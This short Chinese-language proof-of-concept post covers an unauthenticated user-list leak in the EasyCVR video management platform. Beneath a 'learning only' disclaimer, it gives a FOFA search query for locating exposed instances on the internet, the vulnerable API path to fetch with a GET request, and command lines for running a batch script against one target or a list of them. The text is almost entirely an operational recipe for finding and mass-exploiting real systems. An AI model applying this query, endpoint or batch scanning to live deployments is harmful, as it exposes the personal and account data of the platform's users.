# EasyCVR 视频管理平台存在用户信息泄露

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与作者无关。该文章仅供学习用途使用！！！

fofa语法

fofa:title="EasyCVR"

POC:

/api/v1/userlist?pageindex=0&pagesize=10



直接GET请求即可

![image-20231219105512392](assets/image-20231219105512392.png)

批量poc(记得安装库)

python poc.py -u 

![image-20231219105617309](assets/image-20231219105617309.png)

python poc.py -f  .txt

![image-20231219105706862](assets/image-20231219105706862.png)